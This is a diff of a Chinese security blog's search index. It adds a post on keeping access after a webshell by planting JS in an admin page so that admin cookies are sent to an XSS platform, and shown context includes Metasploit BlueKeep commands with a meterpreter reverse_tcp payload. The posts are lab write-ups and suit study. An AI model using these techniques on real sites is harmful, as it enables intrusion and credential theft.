@@ -1,6 +1,45 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>XSS利用JS获取Cookie维持权限</title>
+    <url>/2020/01/26/XSS%E5%88%A9%E7%94%A8JS%E8%8E%B7%E5%8F%96Cookie%E7%BB%B4%E6%8C%81%E6%9D%83%E9%99%90/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>可以知道XSS是利用浏览器或者服务端加载JS达到目的，那么获取Webshell后，将JS插入到后端文件中，则每次加载都会自动执行插入的JS，以此可以获取最新cookie，达到维持权限的目的。</p>
+<a id="more"></a>
+
+<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>先在自己服务器上随便搭建了一个网站，百度找的源码。我将直接在服务器上写入一句话，获取Webshell。</p>
+<p>观察一下这个网站的后台登录页面为/admin/cms_login.asp</p>
+<img src="/2020/01/26/XSS利用JS获取Cookie维持权限/timg1.PNG">
+
+<p>现在输入一个错误的用户名密码，url没有变化，弹窗提示消息</p>
+<img src="/2020/01/26/XSS利用JS获取Cookie维持权限/timg2.PNG">
+
+<p>输入正确的用户名密码进入后台，此时url变为/admin/cms_welcome.asp</p>
+<img src="/2020/01/26/XSS利用JS获取Cookie维持权限/timg3.PNG">
+
+<p>可以发现登录成功后，后台管理页面为cms_welcome.asp ，每次管理员登录后台都一定会加载这个页面，如果已经获取了Webshell，那么在cms_welcome.asp 中加入JS 获取当前cookie并返回结果，每次管理员登录时都一定会加载插入的JS，就可以保持cookie的更新，从而维持权限。</p>
+<p>对于返回cookie我们可以利用XSS平台模块获取信息。</p>
+<img src="/2020/01/26/XSS利用JS获取Cookie维持权限/timg4.PNG">
+
+<p>用蚁剑连接网站，找到cms_welcome.asp 并在其中加入JS</p>
+<img src="/2020/01/26/XSS利用JS获取Cookie维持权限/timg5.PNG">
+
+<p>现在模拟管理员登录后台，然后去XSS平台查看收到的cookie</p>
+<img src="/2020/01/26/XSS利用JS获取Cookie维持权限/timg6.PNG">
+
+<p>可以发现返回的cookie中带有adminpassword、adminname等关键信息</p>
+<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>利用此方法维持权限访问需要满足几个条件</p>
+<p>①已经获取Webshell ②有修改权限</p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>Web渗透</tag>
+        <tag>Xss</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>.htaccess文件上传漏洞利用</title>
     <url>/2020/01/20/htaccess%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。它是Apache服务器中的一个配置文件，负责相关目录下的网页配置。通过.htaccess文件，可以帮我们实现:网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。<br>当网站允许上传或修改.htaccess文件时，我们就可以利用.htaccess文件中的一些规则，来达到我们的目的。</p>
@@ -46,9 +85,9 @@
         <category>Web</category>
       </categories>
       <tags>
+        <tag>漏洞</tag>
         <tag>Web</tag>
         <tag>Web渗透</tag>
-        <tag>漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -126,10 +165,10 @@
         <category>Web</category>
       </categories>
       <tags>
+        <tag>漏洞</tag>
         <tag>Web</tag>
         <tag>靶场练习</tag>
         <tag>Web渗透</tag>
-        <tag>漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -474,7 +513,7 @@ args_test : [&apos;hello world&apos;,&apos;123456&apos;,&apos;password&apos;]</c
   <entry>
     <title>存储型XSS靶场探究</title>
     <url>/2019/11/04/DoraBox%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0-XSS%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
-    <content><![CDATA[<h1 id="DoraBox-XSS-存储型"><a href="#DoraBox-XSS-存储型" class="headerlink" title="DoraBox_XSS 存储型"></a>DoraBox_XSS 存储型</h1><h4 id="什么是存储型XSS"><a href="#什么是存储型XSS" class="headerlink" title="什么是存储型XSS"></a>什么是存储型XSS</h4><p>我个人对存储型XSS的理解，是与反射型XSS相对的，反射型XSS只能执行一次，而存储型XSS在满足条件后，可以执行多次。</p>
+    <content><![CDATA[<h1 id="DoraBox-XSS-存储型"><a href="#DoraBox-XSS-存储型" class="headerlink" title="DoraBox_XSS 存储型"></a>DoraBox_XSS 存储型</h1><h4 id="什么是存储型XSS"><a href="#什么是存储型XSS" class="headerlink" title="什么是存储型XSS"></a>什么是存储型XSS</h4><p>我个人对存储型XSS的理解，反射型XSS即时执行一次，而存储型XSS在满足触发条件后执行，就像埋了个地雷。</p>
 <p>在 <a href="https://baike.baidu.com/item/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1/12350206?fr=aladdin" target="_blank" rel="noopener">《XSS跨站脚本攻击剖析与防御》</a>一书中对存储型XSS是这样定义的：</p>
 <p>持久型跨站脚本（Presistent Cross-site Scripting）也等于<a href="https://blog.csdn.net/weixin_44720762/article/details/89736508" target="_blank" rel="noopener">存储型跨站脚本（Stored Cross-site Scripting）</a>，比反射型跨站脚本更具有威胁性，并且可能影响到Web服务器的安全。持久型XSS一般出现在网站的留言、评论、博客日志等交互处，恶意脚本被存储到客户端或服务器的数据库中，当其他用户浏览该网页时，站点即从数据库中读取恶意用户存入的非法数据，然后显示在网页中，即在受害者主机上的浏览器执行恶意代码。</p>
 <a id="more"></a>
@@ -507,7 +546,7 @@ args_test : [&apos;hello world&apos;,&apos;123456&apos;,&apos;password&apos;]</c
     <url>/2019/11/04/DoraBox%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0-XSS%EF%BC%88%E4%B8%80%EF%BC%89/</url>
     <content><![CDATA[<h1 id="DoraBox-XSS-反射型"><a href="#DoraBox-XSS-反射型" class="headerlink" title="DoraBox_XSS 反射型"></a>DoraBox_XSS 反射型</h1><h4 id="什么是反射型XSS"><a href="#什么是反射型XSS" class="headerlink" title="什么是反射型XSS"></a>什么是反射型XSS</h4><p>作为DoraBox第一次的XSS漏洞练习，先看一下什么是XSS：</p>
 <p><a href="https://baike.baidu.com/item/XSS%E6%94%BB%E5%87%BB/954065?fr=aladdin" target="_blank" rel="noopener">XSS(Cross-site Scripting)</a>通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序(来源百度百科)</p>
-<p>我所理解的反射型XSS是XSS的一种， 是一次性的XSS。在满足条件时，只能触发一次，下一次就无法再触发，除非重新部署。</p>
+<p>我所理解的反射型XSS是XSS的一种， 是即时性XSS。在满足条件时，即时触发，下一次需要再次部署payload</p>
 <p>在 <a href="https://baike.baidu.com/item/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1/12350206?fr=aladdin" target="_blank" rel="noopener">《XSS跨站脚本攻击剖析与防御》</a>一书中对反射型XSS是这样定义的：</p>
 <p><a href="http://www.ttlsa.com/safe/xss-description/" target="_blank" rel="noopener">反射型跨站脚本（Reflected Cross-site Scripting）</a>也称非持久型，参数型跨站脚本。这类跨站脚本是做常见的，主要是将恶意脚本附加到URL地址参数中。反射型XSS的利用一般是攻击者通过特殊的手法（比如利用电子邮件），诱使用户点击这些特定链接时，恶意的JavaScript代码会直接在受害者主机上执行。他的特点是指在用户点击时触发，而且只执行一次，非持久化，所以称为反射型跨站脚本。</p>
 <a id="more"></a>
@@ -1005,7 +1044,7 @@ set lhosts 10.10.10.128
 set target 3
 set payload windows/x64/meterpreter/reverse_tcp
 exploit</code></pre><p>4、执行成功</p>
-<img src="/2019/10/01/CVE-2019-0708/CVE-2019-0807.PNG" title="avatar">
+<img src="/2019/10/01/CVE-2019-0708/CVE-2019-0807.PNG">
 
 <p> ps: 第一次复现时成功get shell。第二次复现，只能让靶机蓝屏，暂未查明原因，待补充。</p>
 <p>参考教程：</p>
